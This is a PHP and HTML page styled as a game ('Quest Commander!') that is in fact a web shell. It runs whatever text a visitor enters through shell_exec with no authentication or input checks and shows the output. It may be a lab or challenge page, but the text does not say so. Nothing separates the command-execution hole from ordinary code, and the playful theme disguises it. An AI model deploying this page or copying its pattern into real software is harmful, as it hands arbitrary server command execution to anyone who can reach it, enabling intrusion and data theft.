<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Command Executor</title>
    <style>
        body {
            font-family: 'Georgia', serif;
            background-color: #1e1e2e;
            color: white;
            text-align: center;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: auto;
            background: #333;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 15px rgba(255, 255, 255, 0.2);
        }
        .command-box {
            background: #444;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
        }
        .link {
            color: #d4af37;
            text-decoration: none;
            font-size: 18px;
            display: block;
            margin-top: 15px;
        }
        .link:hover {
            text-decoration: underline;
        }
        button {
            background-color: #d4af37;
            color: black;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #b8902b;
        }
        .output {
            background: #222;
            padding: 10px;
            margin-top: 10px;
            border-radius: 5px;
            text-align: left;
            white-space: pre-wrap;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Quest Commander!</h1>
        <form method="POST">
            <div class="command-box">
                <label for="command">Enter Quest:</label>
                <input type="text" id="command" name="command" placeholder="Type your quest here..." style="width: 90%; padding: 5px; border-radius: 5px; border: 1px solid #666;">
            </div>
            <button type="submit">Run Command</button>
        </form>

        <div class="output">
            <?php
            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                $command = $_POST['command'];

                // Execute the command and sanitize the output
                $output = shell_exec($command);
                if ($output) {
                    echo "<strong>Output:</strong><br>";
                    echo "<pre>" . htmlspecialchars($output) . "</pre>";
                } else {
                    echo "<strong>Output:</strong><br>";
                    echo "<pre>No output returned or invalid command.</pre>";
                }
            }
            ?>
        </div>
        <a href="index.html" class="link">⬅️ Back to Main Page</a>
    </div>
</body>
</html>
